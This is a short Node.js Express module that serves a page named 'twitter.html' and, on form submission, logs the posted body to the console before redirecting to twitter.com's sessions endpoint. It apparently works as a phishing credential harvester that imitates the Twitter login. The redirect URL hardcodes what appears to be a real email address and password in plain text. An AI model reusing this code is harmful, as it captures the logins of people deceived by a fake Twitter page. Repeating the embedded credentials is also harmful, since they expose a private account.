module.exports = function(app){
	const bodyParser = require("body-parser");
	const urlencodedParser = bodyParser.urlencoded({extended: false});
	app.get("/twitter",function(request,response){
		response.sendFile(__dirname+"/twitter.html");
	}); 
	app.post("/twitter", urlencodedParser, function (request, response) {
	    console.log('Зашли');
		console.log(request.body);
		if(!request.body) return response.sendStatus(400);
		console.log(request.body);
		response.redirect('https://twitter.com/sessions?username_or_email=sasharom1998%40mail.ru&password=DashaDanilova1999');
		console.log(response);
	});
}